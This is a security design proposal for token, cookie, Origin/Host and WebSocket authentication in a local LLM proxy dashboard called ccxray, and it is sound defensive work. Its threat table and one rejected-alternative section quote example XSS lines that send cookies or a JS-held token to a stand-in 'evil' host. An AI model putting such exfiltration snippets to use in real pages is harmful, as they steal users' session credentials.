# Candidate A — Bearer-only for machines, HttpOnly session cookie minted via one-shot redemption for browsers, with strict Origin/Host pinning

## 1. Stance / one-sentence summary

**Keep `AUTH_TOKEN` as the single shared secret; require machine clients (Claude Code, Codex, curl, CI) to present it as `Authorization: Bearer <token>` on every request; for browsers, mint a short-lived `HttpOnly; SameSite=Strict; Path=/` session cookie via a single one-shot redemption endpoint (`GET /_auth?token=<AUTH_TOKEN>` → 302 + `Set-Cookie` + scrub token from URL), then enforce one unified middleware that accepts *either* the bearer header *or* the cookie, validates `Origin`/`Host` against a server-side allowlist on every state-changing request and every upgrade, and treats absence of `AUTH_TOKEN` as "127.0.0.1-only, anonymous OK".**

This is the only design that simultaneously fixes the four real bugs (subresource 401, URL leak, missing CSRF defense, DNS-rebinding exposure) without adding a runtime dependency, without monkey-patching client transports, and without forking the codepath per client class.

---

## 2. Component-level architecture

### 2.1 Modules touched

| Module | Change | LOC impact |
|---|---|---|
| `server/auth.js` | Becomes the auth core: token check + cookie issuance + cookie verification + Origin/Host validation + DNS-rebind guard. Single export `authGate(req, res, { kind })`. | Grows from 35 → ~180. Still one file. |
| `server/index.js` | Replace the single `authMiddleware(...)` call with `authGate(req, res, { kind: classifyRequest(req) })` and wire the upgrade handler. The upgrade handler now calls `authGate` before invoking `handleWebSocketUpgrade`. | ~15 lines changed. |
| `server/hub.js` | Hub IPC routes (`/_hub/register`, `/_hub/unregister`, `/_hub/health`) bypass `authGate` only when bound to `127.0.0.1` AND the request carries the hub shared secret already written to `~/.ccxray/hub.json` (mode `0600`). | ~10 lines. |
| `server/ws-proxy.js` | Reads `req.ccxrayAuth` set by upgrade gate; rejects upgrade if absent. | ~5 lines. |
| `public/index.html` | No change. | 0 |
| `public/app.js`, `public/miller-columns.js`, `public/sse.js` | **No change.** Cookies attach automatically; SSE and `fetch` calls are already same-origin relative paths. | 0 |
| `README.md` / `CLAUDE.md` | Document the new bootstrap URL and the cookie behavior. | docs only |

**Auth logic stays in `server/auth.js` (one file) plus the three call sites that compose it. The maintainability rubric is satisfied with margin.**

### 2.2 Request classifier (`classifyRequest`)

```
if req.headers.upgrade?.toLowerCase() === 'websocket'         → 'upgrade'
elif url.pathname.startsWith('/_hub/')                         → 'hub-ipc'
elif url.pathname === '/_auth' || url.pathname === '/_logout' → 'auth-endpoint'
elif method === 'GET' && (pathname === '/' ||
                          pathname.endsWith('.html') ||
                          pathname.endsWith('.css') ||
                          pathname.endsWith('.js')  ||
                          pathname === '/favicon.ico')         → 'static'
elif pathname === '/_events'                                   → 'sse'
elif pathname.startsWith('/_api/')                             → 'api'
elif pathname.startsWith('/v1/') ||
     pathname.startsWith('/v0/') ||
     pathname === '/anthropic' ||
     /known upstream prefixes/                                 → 'upstream-proxy'
else                                                           → 'api'   // safe default
```

The classifier is deterministic and lives in `auth.js`. No per-route bespoke handling — `authGate` reads the kind and applies the right policy.

### 2.3 Request flows by client class

#### A. LLM client (Claude Code / Codex CLI)

```
Claude Code → POST /v1/messages
              Authorization: Bearer <AUTH_TOKEN>       (ccxray's gate token)
              x-api-key: sk-ant-...                    (Anthropic's own key, untouched)
              host: localhost:5577

ccxray:
  classifyRequest → 'upstream-proxy'
  authGate:
    - if AUTH_TOKEN unset: require remote == 127.0.0.1; allow
    - else: require Authorization: Bearer <AUTH_TOKEN>; cookie ignored on this path
    - Origin check skipped for upstream-proxy (no browser issues these)
    - Host check: enforced (rebind guard)
  → forward to Anthropic via forwardRequest()
```

The LLM client uses the bearer **exclusively**. We never set a cookie on these responses (Codex/Claude Code don't have a cookie jar that would matter, and we don't want one).

Implementation note: the CLI launcher (`server/providers.js`) already injects `ANTHROPIC_BASE_URL`. We extend it: when `AUTH_TOKEN` is set, inject `ANTHROPIC_AUTH_TOKEN=<AUTH_TOKEN>` as an *additional* header via the launcher's env (Anthropic SDK supports a custom auth header; Codex supports `-c request_headers`). Users who run their CLI outside the launcher set the header themselves with one `export` line. This keeps the "≤ 1 step beyond setting `AUTH_TOKEN`" rubric.

#### B. Dashboard browser

```
First visit:
  User opens http://localhost:5577/?token=<AUTH_TOKEN>      (this is the only URL form documented)

  ccxray sees pathname='/' with ?token=...:
    classifyRequest → 'static'  (after a redirect step, see below)
    authGate (static, no cookie, has ?token):
      → 302 to /_auth?token=<AUTH_TOKEN>&next=/

  GET /_auth?token=<AUTH_TOKEN>&next=/
    classifyRequest → 'auth-endpoint'
    authGate:
      - constant-time compare token to AUTH_TOKEN
      - if match:
          mint random 32-byte session id `S` (crypto.randomBytes(32).toString('base64url'))
          store sha256(S) in in-memory Set<string> with expiry now+8h
          response: 302 /  + Set-Cookie:
            ccxray_session=<S>; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800
            (Secure attribute added if req.headers['x-forwarded-proto']==='https' OR server is bound to non-loopback AND CCXRAY_FORCE_SECURE_COOKIE=1)
      - if mismatch: 401, no cookie set

Subsequent requests (HTML, .css, .js, /_api/*, /_events):
  Browser auto-sends Cookie: ccxray_session=<S>
  authGate:
    - extract cookie, sha256, lookup in valid-set
    - if valid AND request kind in {static, sse, api}:
        - if kind in {api, sse} AND method != GET:  enforce Origin/Host CSRF check
        - allow
    - else: 401 + a tiny 'reauth needed' JSON for /_api/*, redirect to /_login for HTML
```

The `/style.css`, `/app.js`, etc. subresource 401 bug is fixed for free because the cookie applies to `Path=/`. SSE works because `EventSource` sends cookies. No `fetch` patching, no `EventSource` patching, no client-side changes.

#### C. CLI / scripts / curl

```
curl -H 'Authorization: Bearer <AUTH_TOKEN>' http://localhost:5577/_api/entries?limit=10

  classifyRequest → 'api'
  authGate:
    - bearer present and equals AUTH_TOKEN → allow
    - cookie path not taken
    - CSRF Origin check: SKIPPED when authenticated by bearer (bearer cannot be sent by a browser victim cross-origin without explicit JS — that JS must be running on a page that already has the bearer, which is the attacker's problem, not ours)
    - Host check: enforced
```

Bearer-authenticated requests are **exempt from the Origin/Host CSRF check** because the cross-site forgery class (browser ambient credentials) does not apply to a header an attacker page cannot add to a same-port request without already having the secret. This is the same reasoning the OWASP CSRF cheat sheet uses to justify the "custom header" pattern.

#### D. WebSocket upgrade (Codex `/v1/responses`, `/v1/realtime`)

```
server.on('upgrade', (req, socket, head) => {
  if (!authGate.forUpgrade(req, socket)) {        // writes 401 to socket and destroys it
    return;
  }
  handleWebSocketUpgrade(req, socket, head);
});
```

The upgrade gate accepts **only** `Authorization: Bearer <AUTH_TOKEN>` (codex sets this when launched via ccxray's launcher; users running codex by hand set it explicitly). It rejects cookie auth on upgrades to prevent the cookie-CSRF-over-WS class (browser `new WebSocket()` does send cookies but cannot set a bearer header — accepting cookie here re-opens the same hole closed for state-changing API calls).

---

## 3. Concrete protocol details

### 3.1 Endpoints added

| Method | Path | Purpose | Auth |
|---|---|---|---|
| `GET`  | `/_auth?token=<T>&next=<path>` | Token-to-cookie redemption. 302 + `Set-Cookie` on success. | constant-time compares `T` to `AUTH_TOKEN` |
| `POST` | `/_logout` | Invalidate current session. 204 + `Set-Cookie: ccxray_session=; Max-Age=0`. | cookie OR bearer |

That's it. Two endpoints. Everything else uses the existing route table.

### 3.2 Cookie

```
Set-Cookie: ccxray_session=<S>; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800
```

Attribute rationale:

| Attribute | Value | Why |
|---|---|---|
| `HttpOnly` | yes | Blocks XSS-in-conversation-content exfil. Conversation rendering already escapes, but defense in depth. |
| `SameSite=Strict` | Strict, not Lax | We never need top-level cross-site navigation to authenticate. Strict kills the entire form-POST/cross-origin-fetch CSRF class at the browser layer. |
| `Path=/` | yes | Fixes the subresource 401 bug — `.css`, `.js`, `/_api/*`, `/_events` all share the same path scope. |
| `Domain` | **unset** | Locks to exact host (`localhost:5577`). Domain-binding to a parent is what enables some DNS rebind variants; leaving it unset means the browser sends the cookie *only* for the exact host. |
| `Secure` | conditional | Set when serving over TLS (proxy in front) or when `CCXRAY_FORCE_SECURE_COOKIE=1`. Loopback HTTP requires omitting it. |
| `Max-Age=28800` | 8 hours | One working day. Re-redemption with the bookmarked `/_auth?token=...` URL is one click. |

### 3.3 Wire-format examples

**Browser bootstrap (success):**

```
GET /_auth?token=hunter2&next=/ HTTP/1.1
Host: localhost:5577

HTTP/1.1 302 Found
Location: /
Set-Cookie: ccxray_session=2k9wQ7sZk-7vJjP1AaBb-zQyXxRrTt9LpKkMnB0qHcU; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800
Cache-Control: no-store
Vary: Cookie
Content-Length: 0
```

**Authenticated dashboard request (subsequent):**

```
GET /_api/entries?limit=10 HTTP/1.1
Host: localhost:5577
Cookie: ccxray_session=2k9wQ7sZk-7vJjP1AaBb-zQyXxRrTt9LpKkMnB0qHcU
Origin: http://localhost:5577

HTTP/1.1 200 OK
Content-Type: application/json
Vary: Cookie, Origin
...
```

**CLI / curl (unchanged):**

```
GET /_api/entries?limit=10 HTTP/1.1
Host: localhost:5577
Authorization: Bearer hunter2

HTTP/1.1 200 OK
Content-Type: application/json
...
```

**WS upgrade from codex:**

```
GET /v1/responses HTTP/1.1
Host: localhost:5577
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: ...
Sec-WebSocket-Version: 13
Authorization: Bearer hunter2
openai-beta: responses_websockets=*
```

**State-changing API call from dashboard (CSRF-protected):**

```
POST /_api/intercept/abc123/approve HTTP/1.1
Host: localhost:5577
Origin: http://localhost:5577
Cookie: ccxray_session=2k9wQ7sZk-7vJjP1AaBb-zQyXxRrTt9LpKkMnB0qHcU
Content-Type: application/json
Content-Length: 0

HTTP/1.1 200 OK
```

### 3.4 The Origin/Host check (rebind + CSRF in one shot)

`authGate` builds the allowlist once at boot from the bind address(es) and the `CCXRAY_PUBLIC_ORIGINS` env (comma-separated, optional):

```
allowedHosts = new Set([
  `localhost:${PORT}`, `127.0.0.1:${PORT}`, `[::1]:${PORT}`,
  ...envSplit('CCXRAY_PUBLIC_ORIGINS')   // e.g. "ccxray.devbox.tail-abc.ts.net:5577"
])
```

For every cookie-authenticated request AND every state-changing request regardless of auth method:

```
if (!allowedHosts.has(req.headers.host)) → 421 Misdirected Request
if (req.method !== 'GET' && req.method !== 'HEAD') {
  const origin = req.headers.origin
  if (!origin) → 403            // non-GET without Origin = block (browsers always send Origin on POST since 2020)
  const u = new URL(origin)
  if (!allowedHosts.has(u.host)) → 403
}
```

This kills DNS rebinding (attacker `evil.com` re-resolves to 127.0.0.1, but `Host: evil.com` is rejected) and kills cross-origin form-POST CSRF (Origin won't match).

---

## 4. Threat-by-threat mitigation table

| # | Threat | Defense | Layer | Residual risk |
|---|---|---|---|---|
| 1 | **Malicious website CSRF** (form POST or `fetch({credentials:'include'})` against `http://localhost:5577`) | (a) `SameSite=Strict` on cookie blocks the cookie from being sent on any cross-site request, full stop. (b) **Origin check** on all non-GET requests as defense-in-depth. (c) `<form>` with default `enctype` cannot set `Content-Type: application/json` — and the API only honors JSON for state-changing endpoints — but we don't rely on that. | Cookie + middleware | None. Three independent gates. |
| 2 | **DNS rebinding** (attacker domain re-resolves to 127.0.0.1) | **Host header validation against `allowedHosts`**. Browser sends `Host: attacker.com` after rebind; server returns 421. Cookie also wouldn't be sent because cookie is bound to `localhost:5577`/`127.0.0.1:5577` exactly (no `Domain` attribute). | Middleware + cookie scope | None for the default loopback case. |
| 3 | **Token exfiltration via URL surface** (history, Referer, logs, paste) | The `?token=` URL is used **exactly once**, at first dashboard load, then 302s to `/` with `Cache-Control: no-store` and the cookie set. The token never appears in any URL the browser navigates to after that — history shows `/`, Referer header points at `/`. CLI users continue to use header-only (already best practice). | Bootstrap protocol | The bookmark/URL the user pasted into their address bar still contains the token until they re-bookmark `/`. Documented and acceptable: same risk profile as any "magic link" auth. |
| 4 | **XSS-in-conversation-content** (LLM/tool output rendered in dashboard, attacker injects `<script>`) | (a) `HttpOnly` cookie — JS cannot read it, so token cannot be exfiltrated via `fetch('https://evil/?'+document.cookie)`. (b) Attacker JS *can* still issue authenticated requests via same-origin `fetch`. That residual is accepted: it's an XSS bug, not an auth bug; the right fix is the existing HTML escaping in `entry-rendering.js`. Auth scheme blocks credential theft, which is the worse outcome (persistent access vs one-shot RCE on the proxy). | Cookie attribute + accept-with-rationale | The "attacker-as-active-session" residual is documented. |
| 5 | **Plain-HTTP eavesdropping** (non-local deployment) | **Out of scope by stated constraint** ("ccxray has no HTTPS"). Mitigation guidance baked into setup docs: "for remote deployment, terminate TLS in front (Caddy / Tailscale Serve / SSH tunnel); set `CCXRAY_FORCE_SECURE_COOKIE=1` so the cookie gets the `Secure` flag." We don't pretend to solve TLS — we make sure the cookie behaves correctly when someone else does. | Documentation + Secure flag | Accepted. Plain HTTP eavesdropping is unmitigable without TLS, and the constraint says no TLS. |
| 6 | **Token leak via WebSocket upgrade URL** | The upgrade gate **only accepts `Authorization: Bearer`**, never `?token=` in the WS URL. Codex sets this header (it's an HTTP request before the upgrade). Users running their own WS clients use the header too. The query-string mode on WS is rejected with 401 at upgrade time — closing the leak channel by construction. | Upgrade middleware | None. |

---

## 5. Migration path

The migration must not strand users who set `AUTH_TOKEN=foo` last month and have curl scripts baked.

### 5.1 Backward-compatibility statement

**Bearer header semantics are preserved exactly.** Any script that does `curl -H 'Authorization: Bearer $AUTH_TOKEN'` continues to work with zero changes. This is the primary CLI/CI usage path and we will not break it.

### 5.2 What changes

| Old behavior | New behavior | Breakage? |
|---|---|---|
| `Authorization: Bearer <T>` | Same. | None |
| `?token=<T>` on every URL | `?token=<T>` accepted **only** on `GET /_auth` (the redemption endpoint) and on `GET /` (auto-redirected to `/_auth`). Rejected with 401 elsewhere (with a clear message: "token in query is only valid at /_auth"). | Mild. Users who scripted `?token=` are pushed to header form. Two-release deprecation: in vN, query-token still works everywhere with a `X-Ccxray-Deprecation: token-query` warning header; removed in vN+1. |
| Browser hits `/?token=X` and breaks on subresources | Browser hits `/?token=X`, gets 302 → `/_auth?token=X&next=/`, gets cookie, lands on `/` working. | Fix, not breakage. |
| `AUTH_TOKEN` unset → allow all | Same — but **also** require `remoteAddress` to be loopback when `AUTH_TOKEN` unset. New hardening, documented. | If someone was running ccxray bound to 0.0.0.0 with no token, that now requires `CCXRAY_ALLOW_ANONYMOUS_REMOTE=1` to keep working. Explicit opt-in to a footgun. |

### 5.3 Rollout in 3 commits

1. **Commit 1 — pure addition.** Add `/_auth` endpoint, cookie minting, Origin/Host check (warn-only mode, log violations, don't block). Add `gateForUpgrade`. Keep query-token working everywhere. No client changes needed. Tests pass; nothing breaks.
2. **Commit 2 — flip enforcement.** Origin/Host check moves from warn to block. Query-token restricted to `/_auth` and `/`. The launcher (`providers.js`) starts setting the `Authorization` header automatically for spawned CLI children. README and CLAUDE.md updated.
3. **Commit 3 — clean up.** Remove the deprecation header path. `server/auth.js` lands in its final shape (~180 LOC).

This staging means there is never a release where a working setup suddenly fails on upgrade. The "warn-only" intermediate gives users one version cycle to notice.

### 5.4 Hub mode migration

Hub IPC (`/_hub/register`, `/_hub/unregister`, `/_hub/health`) is the one path that today is correctly placed *before* the auth middleware. We preserve that behavior with two strengthenings:

- Hub IPC is accepted **only** when `remoteAddress` is loopback.
- Hub lockfile (`~/.ccxray/hub.json`, mode `0600`) now contains an additional field `ipcSecret` (32 random bytes, base64url). Clients read the lockfile (which they already do for discovery) and must send `X-Ccxray-Hub-Secret: <ipcSecret>` on IPC calls. Filesystem permissions are the trust root; the secret turns same-machine other-user readability into a non-issue if the home dir is later misconfigured.

This is additive — existing hub semantics keep working; the secret is an extra belt over the existing suspenders.

---

## 6. Explicitly rejected alternatives

### 6.1 Pure cookie (no bearer support)

**Rejected.** Breaks the explicit constraint "CLI/scripts MUST still work" with `curl -H 'Authorization: Bearer X'`. Forcing curl users to first hit `/_auth` to mint a cookie, then store it in a jar (`-c cookies.txt`) and replay it (`-b cookies.txt`) is a regression every CI pipeline would feel. Also: cookies on bearer-style integrations (Codex SDK, Anthropic SDK) require cookie-jar support that the SDKs don't provide cleanly.

### 6.2 Pure bootstrap-injection (inject token into `window.__CCXRAY_TOKEN__` in `index.html`, JS attaches to every `fetch`/`EventSource`/`WebSocket`)

**Rejected.** Violates the explicit maintainability rubric: "no client-side monkey-patching of `fetch`/`EventSource`/`WebSocket`." It also degrades the threat model — token now lives in JS-readable memory, so any XSS-in-conversation-content immediately exfiltrates it (`fetch('https://evil/?'+window.__CCXRAY_TOKEN__)`). Cookie + `HttpOnly` is strictly stronger. And `EventSource` cannot send custom headers, so the bootstrap pattern requires a polyfill or a `?token=` fallback on `/_events`, which puts the token back in URLs and access logs. The whole point of moving away from `?token=` is undone.

### 6.3 OAuth / OIDC / device-code flow

**Rejected.** Violates "no external IdP / SSO / OAuth" and "zero new runtime deps". OAuth solves problems ccxray doesn't have (third-party identity, scoped consent, multi-user) and adds enormous failure surface (refresh tokens, JWKS rotation, clock skew) for a tool whose entire purpose is to be `npx`-able with no infrastructure. The trust root is already "you set an env var on your own machine" — OAuth assumes a richer trust hierarchy that doesn't exist here.

### 6.4 mTLS

**Rejected.** Requires every CLI client (Claude Code, Codex, curl, custom scripts) to know how to present a client cert. Anthropic SDK and Codex CLI don't expose a client-cert configuration in any first-class way — you'd have to wrap them with a custom HTTPS agent, which is exactly the per-client-class branching the maintainability rubric forbids. mTLS also implies ccxray runs HTTPS, which the constraints say it doesn't. mTLS is the right answer for service-mesh-style internal APIs; it's the wrong answer for a single-process local dev tool.

### 6.5 Honorable mention — rejected: double-submit cookie / synchronizer token CSRF

We do not need a CSRF token *value* (e.g. `X-CSRF-Token` echoed from a cookie). `SameSite=Strict` + Origin check is strictly equivalent for this threat surface, with two fewer moving parts (no per-page token rendering, no token rotation). The synchronizer pattern made sense before browsers shipped `SameSite=Strict` (Chrome 80, 2020); it is overhead in 2026.

### 6.6 Honorable mention — rejected: per-request token rotation / JWT with `exp`

Adds key-management complexity (signing key storage, rotation) with no threat-model benefit at our scope. The session cookie's `Max-Age=28800` plus a server-side `Set<sha256>` of valid sessions is simpler, supports immediate revocation via `/_logout`, and survives the "server restart" case correctly (see §7) by simply requiring re-redemption.

---

## 7. Failure modes & operational notes

### 7.1 Token rotation

Change `AUTH_TOKEN` and restart ccxray. All existing cookies are invalidated automatically because the in-memory session set is wiped on restart and the new tokens won't match. Browser users hit `/`, see 401, re-bookmark `/?token=<new>`. CLI users update their env. **No rotation choreography needed** — the absence of token-derivable cookies is a feature, not a bug.

If a user wants to rotate the token without invalidating active browser sessions (rare): they can't, by design. We accept this. Rotating the master secret SHOULD invalidate all derived credentials.

### 7.2 Cookie clearing

User clears cookies → next request 401 → page-level redirect logic in `index.html` checks for `?token=` and `/_auth?next=` indicator and serves a tiny inline `<noscript>`-safe message: "Session expired. Re-open the dashboard URL you bookmarked (`http://localhost:5577/?token=...`)." No new page; just a 401 body for HTML requests that contains a one-line instruction.

### 7.3 Multiple browser tabs

Cookie is per-origin, not per-tab. All tabs share the session. Open a fifth tab → it inherits the cookie and works immediately. Closing one tab does not invalidate the others. This is the expected and desired behavior for a dev dashboard.

### 7.4 Server restart mid-session

In-memory session set is wiped. Existing cookies become invalid (server-side lookup fails). All open dashboards 401 on next SSE heartbeat or `fetch`. **Recovery: re-redeem with the bookmarked `/?token=...` URL.** This is one address-bar hit. We choose this over persisting sessions to disk because (a) it adds an attack surface (session-file readable by other local processes), and (b) restart is rare enough that re-redemption is fine.

The SSE client in `public/app.js` already has reconnect-on-error logic; we add one line: if the EventSource closes with a 401, show a banner "Session expired — reload" rather than thrashing reconnects. Existing client code can absorb this with no architectural change.

### 7.5 Hub mode

The hub process holds the canonical session set. Client `ccxray` invocations don't have their own session sets — they only proxy through the hub. The hub continues to bind loopback only; cookie semantics are unchanged. `~/.ccxray/hub.json` gains the `ipcSecret` field (see §5.4) at file mode `0600`.

When a client process discovers a stale lockfile and decides to fork a new hub (the existing crash-recovery path), the new hub generates a fresh `AUTH_TOKEN` IPC secret and a fresh session set — all old browser sessions invalidate. Same recovery as §7.4.

### 7.6 Non-local HTTP deployment

Operational doc snippet (`README.md` section "Remote deployment"):

> ccxray does not terminate TLS. If you expose it beyond loopback, put it behind a TLS terminator (Tailscale Serve, Caddy, nginx, an SSH `-L` tunnel). Set `CCXRAY_FORCE_SECURE_COOKIE=1` so the session cookie gets the `Secure` attribute. Add the public hostname to `CCXRAY_PUBLIC_ORIGINS=ccxray.example.com:443` so the Host/Origin check passes.

Two env vars, one config line in the reverse proxy. No code change.

### 7.7 The "I forgot to set AUTH_TOKEN before exposing to LAN" footgun

Today: `AUTH_TOKEN` unset + bound to `0.0.0.0` = open dashboard on the LAN. **New hardening:** when `AUTH_TOKEN` is unset, ccxray refuses to serve requests whose `remoteAddress` is non-loopback unless `CCXRAY_ALLOW_ANONYMOUS_REMOTE=1` is explicitly set. The error message is loud and instructive: "ccxray is bound to 0.0.0.0 with no AUTH_TOKEN. Set AUTH_TOKEN, or set CCXRAY_ALLOW_ANONYMOUS_REMOTE=1 if you really mean to run it open."

This converts a silent disaster into a one-flag opt-in.

### 7.8 Constant-time comparison

`authGate` uses `crypto.timingSafeEqual` on equal-length buffers for both the bearer comparison and the cookie-hash comparison. Mismatched-length inputs short-circuit *after* a fake hash to avoid trivial length-leak. This is straightforward Node.js stdlib; zero new deps.

### 7.9 Logging

Successful auth: no log line (avoid spam). Failed auth: one structured log line `{ts, ip, method, path, reason}` to `~/.ccxray/auth.log` with rotation at 10 MB. This is the only place auth is written to disk. We do not log Cookie values, Authorization headers, or query-string tokens — `req.url` is logged with `?token=...` scrubbed by `url-sanitize.js` (which already exists and is wired for log writes).

### 7.10 Test surface added

Three new test files under `test/`:

- `test/auth-cookie.test.js` — `/_auth` issues correct cookie, rejects bad token, sets right attributes, cookie carries across `/style.css` and `/_api/entries`.
- `test/auth-csrf.test.js` — POST without `Origin` is 403; POST with mismatched Origin is 403; POST with bearer (no cookie) skips Origin check; GET never checks Origin.
- `test/auth-rebind.test.js` — request with `Host: evil.com` is 421 regardless of auth.

Each file is < 80 lines using the existing in-repo http test harness (no new deps).

---

## 8. Summary scoring against the rubric

| Rubric criterion | Status |
|---|---|
| Threat 1 (CSRF) | Mitigated: `SameSite=Strict` + Origin check, defense-in-depth. |
| Threat 2 (DNS rebind) | Mitigated: Host allowlist + cookie without `Domain`. |
| Threat 3 (Token in URL) | Mitigated: token-in-URL exists only at `/_auth`, single redirect step, no Referer leak (we set `Referrer-Policy: no-referrer` on `/_auth` response). |
| Threat 4 (XSS exfil of token) | Mitigated for token theft via `HttpOnly`. Residual (XSS → authenticated `fetch`) explicitly accepted as outside auth scope. |
| Threat 5 (plain-HTTP eavesdrop) | Accepted; ops guidance + `Secure` flag toggle when TLS terminator present. |
| Threat 6 (WS URL token leak) | Mitigated: bearer-only on upgrade. |
| First-time setup ≤ 1 step beyond `AUTH_TOKEN` | Yes: set env var, open `/?token=<T>` once. Bookmark. Done. |
| Browser works across reloads | Yes: cookie persists 8h, no manual token re-entry. |
| CLI/curl/CI trivial | Yes: unchanged. |
| Auth logic ≤ 2 files | Yes: 1 file (`server/auth.js`) + 1 file (`server/index.js`) wires it in. |
| No per-route bespoke handling | Yes: single `authGate` switches on a `kind` enum. |
| No client-side monkey-patching | Yes: zero client-side JS changes. |
| Composes with future features | Yes: any new route inherits the gate; any new auth method adds a branch in one file. |

This design is the smallest change that closes every named bug, satisfies every constraint, and leaves the codebase smaller-feeling than it started.

--- end of candidate A ---
